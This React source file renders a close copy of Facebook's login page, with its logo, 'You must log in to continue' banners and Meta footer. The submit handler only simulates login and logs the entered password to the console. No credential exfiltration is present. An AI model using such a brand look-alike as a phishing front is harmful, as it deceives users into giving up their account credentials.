import React, { useState } from "react";
import { Link } from "react-router-dom";

function LoginPage() {
  const [formData, setFormData] = useState({
    email: "",
    password: ""
  });
  const [errors, setErrors] = useState({});
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
    // Clear error when user starts typing
    if (errors[name]) {
      setErrors(prev => ({
        ...prev,
        [name]: ""
      }));
    }
  };

  const validateForm = () => {
    const newErrors = {};

    // Email validation
    if (!formData.email.trim()) {
      newErrors.email = "Email or phone number is required";
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email) && !/^\d{10,}$/.test(formData.email.replace(/\D/g, ""))) {
      newErrors.email = "Please enter a valid email or phone number";
    }

    // Password validation
    if (!formData.password.trim()) {
      newErrors.password = "Password is required";
    } else if (formData.password.length < 6) {
      newErrors.password = "Password must be at least 6 characters";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }

    setIsSubmitting(true);
    
    try {
      // Simulate API call
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      // Handle successful login
      console.log("Login successful:", formData);
      alert("Login successful!");
      
    } catch (error) {
      console.error("Login error:", error);
      alert("Login failed. Please try again.");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div>
      <div className="md:min-h-screen md:bg-gray-100 flex flex-col items-center md:justify-center  ">
        {/* Yellow Info Banner */}
        <div className=" block md:hidden border-b border-[#e3c922] bg-[#fcf9e8] rounded-sm  p-3 mb-4">
          <p
            className=" w-screen font-normal leading-4 text-[13.6px] text-[#737373] px-4  "
            style={{
              fontFamily:
                'ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji"',
            }}
          >
            You must log in first.
          </p>
        </div>

        {/* Facebook Logo */}
        <div className="md:mb-4 md:mt-16 ">
          <img
            src="https://res.cloudinary.com/dzumghpns/image/upload/v1757893721/facebook_ltytcg.png"
            alt="Facebook"
            className="md:h-[36px] h-[18px] w-auto"
          />
        </div>

        {/* Blue Banner with Info */}
        <div className=" hidden md:block w-full max-w-[630px] mb-4">
          <div className=" bg-white  border rounded-sm border-blue-600 flex items-center">
            <div className=" bg-blue-600 py-2 px-3 flex items-center justify-center mr-2">
              <svg
                stroke="currentColor"
                fill="currentColor"
                strokeWidth="0"
                viewBox="0 0 16 16"
                color="white"
                height="18"
                width="18"
                xmlns="http://www.w3.org/2000/svg"
                style={{ color: "white" }}
              >
                <path d="M8 16A8 8 0 1 0 8 0a8 8 0 0 0 0 16m.93-9.412-1 4.705c-.07.34.029.533.304.533.194 0 .487-.07.686-.246l-.088.416c-.287.346-.92.598-1.465.598-.703 0-1.002-.422-.808-1.319l.738-3.468c.064-.293.006-.399-.287-.47l-.451-.081.082-.381 2.29-.287zM8 5.5a1 1 0 1 1 0-2 1 1 0 0 1 0 2"></path>
              </svg>
            </div>
            <span
              className=" font-normal text-[14px] leading-5   "
              style={{
                fontFamily:
                  'ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji"',
              }}
            >
              You must log in to continue.
            </span>
          </div>
        </div>

        {/* White Login Card */}
        <div className="bg-white rounded-lg md:shadow-lg px-3 py-6 w-full max-w-[412px] mb-0 md:mb-14">
          {/* Title */}
          <h2
            className=" hidden md:block font-medium leading-7  text-center text-[17.44px]  mb-4"
            style={{
              fontFamily: "SFProText-Regular, Helvetica, Arial, sans-serif",
            }}
          >
            Log Into Facebook
          </h2>

          {/* Yellow Info Banner */}
          <div className=" hidden md:block border border-[#e3c922] bg-[#fff9d6] rounded-sm p-3 mb-2">
            <p
              className="  font-normal leading-4    text-[12px]   text-center "
              style={{
                fontFamily:
                  'ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji"',
              }}
            >
              You must log in to continue.
            </p>
          </div>

          {/* Login Form */}
          <form onSubmit={handleSubmit} className="space-y-4 ">
            {/* Email Input */}
            <div>
              <input
                type="text"
                name="email"
                value={formData.email}
                onChange={handleChange}
                placeholder="Mobile number or email"
                className={`w-full px-2 md:px-4 md:py-3 py-2 border shadow-md md:bg-transparent
                 border-[#e4e6eb] rounded-md md:rounded-lg focus:border-[#e4e6eb] focus:outline-none
                   text-[#737373] bg-[#e5e7eb] bg-opacity-60 font-[500] text-[14px] leading-5
                    font-['SFProText-Regular',_Helvetica,_Arial,_sans-serif] ${errors.email ? 'border-red-500' : ''}`}
              />
              {errors.email && (
                <p className="text-red-500 text-xs mt-1">{errors.email}</p>
              )}
            </div>

            {/* Password Input */}
            <div className=" ">
              <input
                type="password"
                name="password"
                value={formData.password}
                onChange={handleChange}
                placeholder="Password"
                className={`w-full px-2 md:px-4 md:py-3 py-2 border shadow-md  md:bg-transparent
                border-[#e4e6eb] rounded-md md:rounded-lg focus:border-[#e4e6eb] focus:outline-none
                  text-[#737373] bg-[#e5e7eb] bg-opacity-60 font-[500] text-[14px] leading-5
                   font-['SFProText-Regular',_Helvetica,_Arial,_sans-serif] ${errors.password ? 'border-red-500' : ''}`}
              />
              {errors.password && (
                <p className="text-red-500 text-xs mt-1">{errors.password}</p>
              )}
            </div>

            {/* Login Button */}
            <button
              type="submit"
              disabled={isSubmitting}
              className={`w-full text-[16px] md:text-[20px] font-[600] bg-[#1877f2]
               text-white md:py-2 py-[4px] rounded-md md:rounded-lg  
                hover:opacity-90 transition-colors duration-200 leading-7 text-center ${isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`}
              style={{
                fontFamily:
                  'ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji"',
              }}
            >
              {isSubmitting ? "Logging in..." : "Log in"}
            </button>
          </form>

          {/* Bottom Links */}
          <div className="md:flex md:flex-row flex-col justify-center md:space-x-4 space-y-4 md:space-y-0 items-center mt-3 pb-5 ">
            <div className="flex justify-center">
              <Link
                to="/forgot-password"
                className="text-[#1877f2] text-[14.44px] font-medium leading-5     text-center  hover:underline"
                style={{
                  fontFamily: "SFProText-Regular, Helvetica, Arial, sans-serif",
                }}
              >
                Forgot account?
              </Link>
            </div>

            <div
              className="flex justify-center space-x-4 items-center md:hidden"
              style={{
                fontFamily:
                  'ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji"',
              }}
            >
              <div className="border-t border-[#a3a3a3]  w-full"></div>
              <div className="text-[12px] font-[400] text-[#737373]">or</div>
              <div className="border-t border-[#a3a3a3]  w-full"></div>
            </div>

            <div className="flex justify-center      md:py-0">
              <Link
                to="/signup"
                className="hidden md:block text-[#1877f2] text-[14.44px] font-medium leading-5    text-center  hover:underline"
                style={{
                  fontFamily: "SFProText-Regular, Helvetica, Arial, sans-serif",
                }}
              >
                Sign up for Facebook
              </Link>
              <div className="block md:hidden text-center border rounded-[4px] border-[#a3a3a3] py-1.5 w-[230px] ">
                <Link
                  to="/signup"
                  className="text-[14.44px] font-medium leading-5    text-center  hover:underline"
                  style={{
                    fontFamily:
                      "SFProText-Regular, Helvetica, Arial, sans-serif",
                  }}
                >
                  Creat a new account
                </Link>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Facebook Footer */}
      <div className="h flex  items-center justify-center">
        <div
          className="bg-white py-4 px-4 text-[12px] font-[400] text-[#737373]   "
          style={{
            fontFamily:
              'ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji"',
          }}
        >
          {/* Language Selection Row */}
          <div className="md:flex flex-wrap items-center space-x-6 mb-3 hidden ">
            <Link to="/" className=" hover:underline ">
              English (US)
            </Link>
            <Link to="/" className=" hover:underline ">
              Français (Canada)
            </Link>
            <Link to="/" className=" hover:underline ">
              پښتو
            </Link>
            <Link to="/" className=" hover:underline ">
              العربية
            </Link>
            <Link to="/" className=" hover:underline ">
              हिन्दी
            </Link>
            <Link to="/" className=" hover:underline ">
              বাংলা
            </Link>
            <Link to="/" className=" hover:underline ">
              ਪੰਜਾਬੀ
            </Link>
            <Link to="/" className=" hover:underline ">
              فارسی
            </Link>
            <Link to="/" className=" hover:underline ">
              ગુજરાતી
            </Link>
            <Link to="/" className=" hover:underline ">
              Deutsch
            </Link>
            <Link to="/" className=" hover:underline ">
              Español
            </Link>
            <Link to="/" className=" hover:underline ">
              Italiano
            </Link>
            <button className="border border-[#f0f2f5] w-6 h-6 flex items-center justify-center">
              <svg
                stroke="currentColor"
                fill="#000000"
                strokeWidth="0"
                viewBox="0 0 512 512"
                height="20"
                width="20"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path d="M368.5 240H272v-96.5c0-8.8-7.2-16-16-16s-16 7.2-16 16V240h-96.5c-8.8 0-16 7.2-16 16 0 4.4 1.8 8.4 4.7 11.3 2.9 2.9 6.9 4.7 11.3 4.7H240v96.5c0 4.4 1.8 8.4 4.7 11.3 2.9 2.9 6.9 4.7 11.3 4.7 8.8 0 16-7.2 16-16V272h96.5c8.8 0 16-7.2 16-16s-7.2-16-16-16z"></path>
              </svg>
            </button>
          </div>

          {/* Separator Line */}
          <div className="border-t border-gray-200 mb-3 hidden md:block"></div>

          {/* Main Navigation Links - First Row */}
          <div className=" flex-wrap items-center gap-4 mb-2 hidden md:flex">
            <Link to="/signup" className="  hover:underline">
              Sign Up
            </Link>
            <Link to="/login" className="  hover:underline">
              Log in
            </Link>
            <Link to="/messenger" className="  hover:underline">
              Messenger
            </Link>
            <Link to="/facebook-lite" className="  hover:underline">
              Facebook Lite
            </Link>
            <Link to="/video" className="  hover:underline">
              Video
            </Link>
            <Link to="/places" className="  hover:underline">
              Places
            </Link>
            <Link to="/games" className="  hover:underline">
              Games
            </Link>
            <Link to="/marketplace" className="  hover:underline">
              Marketplace
            </Link>
            <Link to="/meta-pay" className="  hover:underline">
              Meta Pay
            </Link>
            <Link to="/meta-store" className="  hover:underline">
              Meta Store
            </Link>
            <Link to="/meta-quest" className="  hover:underline">
              Meta Quest
            </Link>
            <Link to="/meta-ai" className="  hover:underline">
              Meta AI
            </Link>
            <Link to="/instagram" className="  hover:underline">
              Instagram
            </Link>
            <Link to="/threads" className="  hover:underline">
              Threads
            </Link>
            <Link to="/fundraisers" className="  hover:underline">
              Fundraisers
            </Link>
            <Link to="/services" className="  hover:underline">
              Services
            </Link>
          </div>

          {/* Main Navigation Links - Second Row */}
          <div className=" flex-wrap items-center gap-4 mb-2 hidden md:flex">
            <Link to="/voting" className="  hover:underline">
              Voting Information Centre
            </Link>
            <Link to="/privacy-policy" className="  hover:underline">
              Privacy Policy
            </Link>
            <Link to="/privacy-centre" className="  hover:underline">
              Privacy Centre
            </Link>
            <Link to="/groups" className="  hover:underline">
              Groups
            </Link>
            <Link to="/about" className="  hover:underline">
              About
            </Link>
            <Link to="/create-ad" className="  hover:underline">
              Create ad
            </Link>
            <Link to="/create-page" className="  hover:underline">
              Create Page
            </Link>
            <Link to="/developers" className="  hover:underline">
              Developers
            </Link>
            <Link to="/careers" className="  hover:underline">
              Careers
            </Link>
            <Link to="/cookies" className="  hover:underline">
              Cookies
            </Link>
            <Link to="/adchoices" className="  hover:underline flex items-center gap-1">
              AdChoices
              <span className=" "> 🚩</span>
            </Link>
            <Link to="/terms" className="  hover:underline">
              Terms
            </Link>
            <Link to="/help" className="  hover:underline">
              Help
            </Link>
          </div>

          {/* Additional Information Links */}
          <div className=" flex-wrap items-center gap-4 mb-3 hidden md-flex">
            <Link to="/contact" className="  hover:underline">
              Contact uploading and non-users
            </Link>
            <Link to="/settings" className="  hover:underline">
              Settings
            </Link>
          </div>

          <div
            className="flex -mt-4   md:hidden items-center justfy-center space-x-28 text-[12px] font-[400] text-[#737373]"
            style={{
              fontFamily:
                'ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji"',
            }}
          >
            <div className="space-y-1.5 flex flex-col text-center ">
              <Link to="/" className=" font-[700] hover:underline ">
                English (US)
              </Link>

              <Link to="/" className=" hover:underline ">
                العربية
              </Link>
              <Link to="/" className=" hover:underline ">
                हिन्दी
              </Link>

              <Link to="/" className=" hover:underline ">
                Español
              </Link>
            </div>
            <div className=" space-y-1.5 flex flex-col text-center">
              <Link to="/" className=" hover:underline ">
                پښتو
              </Link>
              <Link to="/" className=" hover:underline ">
                বাংলা
              </Link>
              <Link to="/" className=" hover:underline ">
                ਪੰਜਾਬੀ
              </Link>

              <button className="border border-[#f0f2f5] w-6 h-6 flex items-center justify-center">
                <svg
                  stroke="currentColor"
                  fill="#000000"
                  strokeWidth="0"
                  viewBox="0 0 512 512"
                  height="20"
                  width="20"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path d="M368.5 240H272v-96.5c0-8.8-7.2-16-16-16s-16 7.2-16 16V240h-96.5c-8.8 0-16 7.2-16 16 0 4.4 1.8 8.4 4.7 11.3 2.9 2.9 6.9 4.7 11.3 4.7H240v96.5c0 4.4 1.8 8.4 4.7 11.3 2.9 2.9 6.9 4.7 11.3 4.7 8.8 0 16-7.2 16-16V272h96.5c8.8 0 16-7.2 16-16s-7.2-16-16-16z"></path>
                </svg>
              </button>
            </div>
          </div>

          {/* Copyright Information */}
          <div className="text-center  ">Meta © 2025</div>
        </div>
      </div>
    </div>
  );
}

export default LoginPage;
